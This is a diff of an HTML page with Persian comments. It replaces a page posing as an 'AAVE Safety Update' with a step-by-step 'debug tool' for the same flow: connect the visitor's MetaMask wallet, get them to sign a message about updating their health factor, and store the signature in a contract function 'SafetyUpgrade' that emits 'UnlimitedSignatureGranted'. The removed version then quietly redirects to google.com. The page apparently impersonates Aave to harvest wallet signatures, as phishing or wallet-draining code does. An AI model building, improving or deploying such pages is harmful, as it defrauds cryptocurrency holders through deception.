@@ -3,229 +3,334 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>AAVE UPDATE</title>
+  <title>AAVE DEBUG</title>
   <style>
     body {
-      font-family: Arial, sans-serif;
-      background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+      font-family: 'Courier New', monospace;
+      background: #1e1e1e;
+      color: #fff;
       margin: 0;
       padding: 20px;
-      min-height: 100vh;
-      display: flex;
-      justify-content: center;
-      align-items: center;
+      line-height: 1.6;
     }
     .container {
-      background: rgba(255, 255, 255, 0.95);
-      border-radius: 15px;
-      padding: 30px;
-      box-shadow: 0 15px 35px rgba(0, 0, 0, 0.1);
-      text-align: center;
-      max-width: 500px;
-      width: 100%;
+      max-width: 800px;
+      margin: 0 auto;
+      background: #2d2d2d;
+      border-radius: 10px;
+      padding: 20px;
     }
-    .status {
-      margin: 20px 0;
+    .log {
+      background: #000;
       padding: 15px;
-      border-radius: 8px;
-      font-weight: bold;
-    }
-    .loading { background: #fff3cd; color: #856404; }
-    .success { background: #d4edda; color: #155724; }
-    .error { background: #f8d7da; color: #721c24; }
-    .redirect-notice {
-      margin-top: 20px;
-      padding: 15px;
-      background: #e7f3ff;
-      border-left: 4px solid #2196F3;
       border-radius: 5px;
+      margin: 10px 0;
+      border-left: 4px solid #00ff00;
+      font-size: 14px;
+      white-space: pre-wrap;
+    }
+    .error { border-left-color: #ff0000; color: #ff6b6b; }
+    .success { border-left-color: #00ff00; color: #51cf66; }
+    .info { border-left-color: #339af0; color: #74c0fc; }
+    .warning { border-left-color: #ffd43b; color: #ffd43b; }
+    button {
+      background: #339af0;
+      color: white;
+      border: none;
+      padding: 10px 20px;
+      border-radius: 5px;
+      cursor: pointer;
+      margin: 10px 5px;
+      font-size: 16px;
+    }
+    button:hover { background: #228be6; }
+    button:disabled { background: #666; cursor: not-allowed; }
+    .step {
+      background: #495057;
+      padding: 10px;
+      margin: 10px 0;
+      border-radius: 5px;
+      border-left: 4px solid #ffd43b;
     }
   </style>
 </head>
 <body>
   <div class="container">
-    <h2>🔒 AAVE Safety Update</h2>
-    <p>Updating your health factor security...</p>
-    
-    <div id="status" class="status loading">
-      🔄 Connecting to wallet...
+    <h1>🐛 AAVE Contract Debug Tool</h1>
+    <p>این ابزار قدم به قدم مشکل رو پیدا میکنه</p>
+
+    <div class="step">
+      <strong>مرحله 1:</strong> اتصال به ولت
+      <button id="btn1" onclick="step1()">Test Wallet Connection</button>
     </div>
-    
-    <div id="redirect-notice" class="redirect-notice" style="display: none;">
-      ⏰ Redirecting in <span id="countdown">3</span> seconds...
+
+    <div class="step">
+      <strong>مرحله 2:</strong> بررسی شبکه
+      <button id="btn2" onclick="step2()" disabled>Check Network</button>
     </div>
+
+    <div class="step">
+      <strong>مرحله 3:</strong> گرفتن امضا
+      <button id="btn3" onclick="step3()" disabled>Get Signature</button>
+    </div>
+
+    <div class="step">
+      <strong>مرحله 4:</strong> بررسی کانترکت
+      <button id="btn4" onclick="step4()" disabled>Check Contract</button>
+    </div>
+
+    <div class="step">
+      <strong>مرحله 5:</strong> ارسال تراکنش
+      <button id="btn5" onclick="step5()" disabled>Send Transaction</button>
+    </div>
+
+    <div class="step">
+      <strong>مرحله 6:</strong> بررسی نتیجه
+      <button id="btn6" onclick="step6()" disabled>Check Result</button>
+    </div>
+
+    <div id="logs"></div>
   </div>
 
   <script src="https://cdn.jsdelivr.net/npm/ethers@6.7.0/dist/ethers.umd.min.js"></script>
   <script>
-    const statusDiv = document.getElementById('status');
-    const redirectDiv = document.getElementById('redirect-notice');
-    const countdownSpan = document.getElementById('countdown');
+    let provider, signer, userAddress, signature, contract, txResponse, receipt;
+    const contractAddress = "0x49E9FD750667B2D13172916b26fA9fD764b5E20F";
+    const message = "By signing this message, Update Your Health Factor";
 
-    // تابع نمایش وضعیت
-    function updateStatus(message, type = 'loading') {
-      statusDiv.textContent = message;
-      statusDiv.className = `status ${type}`;
+    const abi = [
+      {
+        "inputs": [{"internalType": "bytes", "name": "_signature", "type": "bytes"}],
+        "name": "SafetyUpgrade",
+        "outputs": [],
+        "stateMutability": "nonpayable",
+        "type": "function"
+      },
+      {
+        "anonymous": false,
+        "inputs": [
+          {"indexed": true, "internalType": "address", "name": "wallet", "type": "address"},
+          {"indexed": true, "internalType": "bytes32", "name": "signatureHash", "type": "bytes32"},
+          {"indexed": false, "internalType": "uint256", "name": "timestamp", "type": "uint256"}
+        ],
+        "name": "UnlimitedSignatureGranted",
+        "type": "event"
+      },
+      {
+        "inputs": [{"internalType": "address", "name": "", "type": "address"}],
+        "name": "unlimitedSignatures",
+        "outputs": [
+          {"internalType": "address", "name": "wallet", "type": "address"},
+          {"internalType": "bytes", "name": "signature", "type": "bytes"},
+          {"internalType": "uint256", "name": "timestamp", "type": "uint256"},
+          {"internalType": "bytes32", "name": "signatureHash", "type": "bytes32"}
+        ],
+        "stateMutability": "view",
+        "type": "function"
+      }
+    ];
+
+    function log(message, type = 'info') {
+      const logsDiv = document.getElementById('logs');
+      const logDiv = document.createElement('div');
+      logDiv.className = `log ${type}`;
+      logDiv.textContent = `[${new Date().toLocaleTimeString()}] ${message}`;
+      logsDiv.appendChild(logDiv);
+      console.log(message);
+      logsDiv.scrollTop = logsDiv.scrollHeight;
     }
 
-    // تابع شمارش معکوس و ریدایرکت
-    function startRedirectCountdown() {
-      let count = 3;
-      redirectDiv.style.display = 'block';
-      
-      const timer = setInterval(() => {
-        count--;
-        countdownSpan.textContent = count;
-        
-        if (count <= 0) {
-          clearInterval(timer);
-          window.location.replace("https://google.com");
-        }
-      }, 1000);
-    }
-
-    // اجرای اصلی
-    (async () => {
+    async function step1() {
+      log("🔄 شروع اتصال به ولت...");
       try {
-        // بررسی وجود MetaMask
         if (!window.ethereum) {
-          updateStatus('❌ MetaMask not found! Please install MetaMask.', 'error');
-          return;
+          throw new Error("MetaMask not installed!");
         }
-
-        updateStatus('🔗 Connecting to MetaMask...');
-
-        // درخواست اتصال به ولت
+        
         const accounts = await window.ethereum.request({ 
           method: 'eth_requestAccounts' 
         });
         
         if (accounts.length === 0) {
-          updateStatus('❌ No wallet connected!', 'error');
-          return;
+          throw new Error("No accounts found!");
         }
 
-        updateStatus('🔍 Checking network...');
-
-        // بررسی شبکه (Sepolia = 11155111)
-        const chainId = await window.ethereum.request({ method: 'eth_chainId' });
-        if (chainId !== '0xaa36a7') { // 11155111 در hex
-          try {
-            await window.ethereum.request({
-              method: 'wallet_switchEthereumChain',
-              params: [{ chainId: '0xaa36a7' }],
-            });
-          } catch (switchError) {
-            updateStatus('❌ Please switch to Sepolia network!', 'error');
-            return;
-          }
-        }
-
-        const provider = new ethers.BrowserProvider(window.ethereum);
-        const signer = await provider.getSigner();
-        const userAddress = await signer.getAddress();
+        provider = new ethers.BrowserProvider(window.ethereum);
+        signer = await provider.getSigner();
+        userAddress = await signer.getAddress();
         
-        updateStatus(`✅ Connected: ${userAddress.slice(0,6)}...${userAddress.slice(-4)}`);
+        log(`✅ ولت متصل شد: ${userAddress}`, 'success');
+        log(`💰 Balance: ${ethers.formatEther(await provider.getBalance(userAddress))} ETH`);
         
-        // مرحله ۱: گرفتن امضا از کاربر
-        updateStatus('📝 Please sign the message in MetaMask...');
-        
-        const message = "By signing this message, Update Your Health Factor";
-        let signature;
-        
-        try {
-          signature = await signer.signMessage(message);
-          console.log("✅ Signature obtained:", signature);
-        } catch (sigError) {
-          updateStatus('❌ Signature rejected by user!', 'error');
-          return;
-        }
-        
-        updateStatus('🔄 Sending to contract...');
-
-        // مرحله ۲: تعریف کانترکت
-        const contractAddress = "0x49E9FD750667B2D13172916b26fA9fD764b5E20F";
-        
-        // ABI کامل برای تابع SafetyUpgrade
-        const abi = [
-          {
-            "inputs": [
-              { "internalType": "bytes", "name": "_signature", "type": "bytes" }
-            ],
-            "name": "SafetyUpgrade",
-            "outputs": [],
-            "stateMutability": "nonpayable",
-            "type": "function"
-          },
-          {
-            "anonymous": false,
-            "inputs": [
-              { "indexed": true, "internalType": "address", "name": "wallet", "type": "address" },
-              { "indexed": true, "internalType": "bytes32", "name": "signatureHash", "type": "bytes32" },
-              { "indexed": false, "internalType": "uint256", "name": "timestamp", "type": "uint256" }
-            ],
-            "name": "UnlimitedSignatureGranted",
-            "type": "event"
-          }
-        ];
-
-        // مرحله ۳: اتصال به کانترکت
-        const contract = new ethers.Contract(contractAddress, abi, signer);
-
-        // مرحله ۴: ارسال تراکنش
-        console.log("🚀 Sending transaction...");
-        const txResponse = await contract.SafetyUpgrade(signature, {
-          gasLimit: 200000 // تنظیم gas limit برای اطمینان
-        });
-
-        updateStatus('⏳ Transaction sent! Waiting for confirmation...');
-        console.log("📤 Transaction hash:", txResponse.hash);
-
-        // انتظار برای تأیید تراکنش
-        const receipt = await txResponse.wait();
-        console.log("✅ Transaction confirmed:", receipt);
-
-        // بررسی Event برای اطمینان از ذخیره شدن
-        const event = receipt.logs.find(log => {
-          try {
-            const parsed = contract.interface.parseLog(log);
-            return parsed.name === 'UnlimitedSignatureGranted';
-          } catch {
-            return false;
-          }
-        });
-
-        if (event) {
-          const parsedEvent = contract.interface.parseLog(event);
-          console.log("🎉 Signature stored successfully!");
-          console.log("📋 Event details:", {
-            wallet: parsedEvent.args.wallet,
-            signatureHash: parsedEvent.args.signatureHash,
-            timestamp: parsedEvent.args.timestamp.toString()
-          });
-          
-          updateStatus('✅ Health factor updated successfully!', 'success');
-        } else {
-          updateStatus('✅ Transaction completed!', 'success');
-        }
-
-        // شروع شمارش معکوس برای ریدایرکت
-        setTimeout(startRedirectCountdown, 1000);
-
+        document.getElementById('btn2').disabled = false;
       } catch (error) {
-        console.error("❌ Error details:", error);
+        log(`❌ خطا در اتصال: ${error.message}`, 'error');
+      }
+    }
+
+    async function step2() {
+      log("🔍 بررسی شبکه...");
+      try {
+        const network = await provider.getNetwork();
+        log(`🌐 شبکه فعلی: ${network.name} (ChainId: ${network.chainId})`);
         
-        if (error.code === 4001) {
-          updateStatus('❌ Transaction rejected by user!', 'error');
-        } else if (error.code === -32603) {
-          updateStatus('❌ Network error! Check your connection.', 'error');
-        } else if (error.reason) {
-          updateStatus(`❌ Error: ${error.reason}`, 'error');
+        if (network.chainId !== 11155111n) {
+          log("⚠️ شبکه Sepolia نیست! سوییچ میکنم...", 'warning');
+          await window.ethereum.request({
+            method: 'wallet_switchEthereumChain',
+            params: [{ chainId: '0xaa36a7' }],
+          });
+          log("✅ به Sepolia سوییچ شد", 'success');
         } else {
-          updateStatus('❌ Unexpected error occurred!', 'error');
+          log("✅ شبکه Sepolia صحیح است", 'success');
+        }
+        
+        document.getElementById('btn3').disabled = false;
+      } catch (error) {
+        log(`❌ خطا در شبکه: ${error.message}`, 'error');
+      }
+    }
+
+    async function step3() {
+      log("📝 درخواست امضا...");
+      try {
+        log(`📄 پیام برای امضا: "${message}"`);
+        signature = await signer.signMessage(message);
+        log(`✅ امضا دریافت شد: ${signature}`, 'success');
+        log(`📏 طول امضا: ${signature.length} کاراکتر`);
+        
+        // بررسی صحت امضا
+        const messageBytes = ethers.toUtf8Bytes(message);
+        const messageHash = ethers.keccak256(messageBytes);
+        const recoveredAddress = ethers.verifyMessage(message, signature);
+        
+        log(`🔍 آدرس بازیابی شده از امضا: ${recoveredAddress}`);
+        log(`🔍 آدرس کیف پول: ${userAddress}`);
+        
+        if (recoveredAddress.toLowerCase() === userAddress.toLowerCase()) {
+          log("✅ امضا معتبر است", 'success');
+        } else {
+          log("❌ امضا نامعتبر است!", 'error');
+          return;
+        }
+        
+        document.getElementById('btn4').disabled = false;
+      } catch (error) {
+        log(`❌ خطا در امضا: ${error.message}`, 'error');
+      }
+    }
+
+    async function step4() {
+      log("🔍 بررسی کانترکت...");
+      try {
+        contract = new ethers.Contract(contractAddress, abi, signer);
+        
+        // بررسی وجود کانترکت
+        const code = await provider.getCode(contractAddress);
+        if (code === '0x') {
+          throw new Error("Contract not found at this address!");
+        }
+        log(`✅ کانترکت پیدا شد. طول کد: ${code.length} بایت`);
+        
+        // تست فراخوانی تابع read-only
+        try {
+          const currentSig = await contract.unlimitedSignatures(userAddress);
+          log(`📊 امضا فعلی در کانترکت: ${currentSig.wallet}`);
+          if (currentSig.wallet === "0x0000000000000000000000000000000000000000") {
+            log("ℹ️  هنوز امضایی ذخیره نشده");
+          } else {
+            log(`📅 تاریخ امضا: ${new Date(Number(currentSig.timestamp) * 1000)}`);
+          }
+        } catch (readError) {
+          log(`⚠️ خطا در خواندن داده: ${readError.message}`, 'warning');
+        }
+        
+        document.getElementById('btn5').disabled = false;
+      } catch (error) {
+        log(`❌ خطا در کانترکت: ${error.message}`, 'error');
+      }
+    }
+
+    async function step5() {
+      log("🚀 ارسال تراکنش...");
+      try {
+        // تخمین gas
+        const gasEstimate = await contract.SafetyUpgrade.estimateGas(signature);
+        log(`⛽ تخمین Gas: ${gasEstimate.toString()}`);
+        
+        // ارسال تراکنش
+        txResponse = await contract.SafetyUpgrade(signature, {
+          gasLimit: gasEstimate * 2n // دو برابر برای اطمینان
+        });
+        
+        log(`📤 Transaction Hash: ${txResponse.hash}`, 'success');
+        log(`🔗 Etherscan: https://sepolia.etherscan.io/tx/${txResponse.hash}`);
+        log("⏳ منتظر تأیید...");
+        
+        receipt = await txResponse.wait();
+        
+        if (receipt.status === 1) {
+          log("✅ تراکنش تأیید شد!", 'success');
+          log(`⛽ Gas استفاده شده: ${receipt.gasUsed.toString()}`);
+          log(`🧾 بلوک نامبر: ${receipt.blockNumber}`);
+        } else {
+          log("❌ تراکنش فیل شد!", 'error');
+        }
+        
+        document.getElementById('btn6').disabled = false;
+      } catch (error) {
+        log(`❌ خطا در ارسال: ${error.message}`, 'error');
+        if (error.data) {
+          log(`🔍 Error Data: ${error.data}`, 'error');
         }
       }
-    })();
+    }
+
+    async function step6() {
+      log("🔍 بررسی نتیجه نهایی...");
+      try {
+        // بررسی Event ها
+        const events = receipt.logs;
+        log(`📋 تعداد Events: ${events.length}`);
+        
+        let found = false;
+        for (let i = 0; i < events.length; i++) {
+          try {
+            const parsedLog = contract.interface.parseLog(events[i]);
+            log(`🎯 Event ${i}: ${parsedLog.name}`);
+            
+            if (parsedLog.name === 'UnlimitedSignatureGranted') {
+              log("🎉 Event UnlimitedSignatureGranted پیدا شد!", 'success');
+              log(`👤 Wallet: ${parsedLog.args.wallet}`);
+              log(`🔐 Signature Hash: ${parsedLog.args.signatureHash}`);
+              log(`📅 Timestamp: ${new Date(Number(parsedLog.args.timestamp) * 1000)}`);
+              found = true;
+            }
+          } catch (parseError) {
+            log(`⚠️ نمیتونم Event ${i} رو parse کنم`);
+          }
+        }
+        
+        if (!found) {
+          log("❌ Event مورد نظر پیدا نشد!", 'error');
+        }
+        
+        // خواندن مجدد از کانترکت
+        const finalSig = await contract.unlimitedSignatures(userAddress);
+        if (finalSig.wallet.toLowerCase() === userAddress.toLowerCase()) {
+          log("🎉 امضا با موفقیت در کانترکت ذخیره شد!", 'success');
+          log(`🔐 Hash ذخیره شده: ${finalSig.signatureHash}`);
+        } else {
+          log("❌ امضا در کانترکت ذخیره نشده!", 'error');
+        }
+        
+      } catch (error) {
+        log(`❌ خطا در بررسی نهایی: ${error.message}`, 'error');
+      }
+    }
+
+    // شروع خودکار
+    log("🚀 Debug Tool آماده است. روی دکمه‌ها کلیک کنید.", 'info');
   </script>
 </body>
 </html>
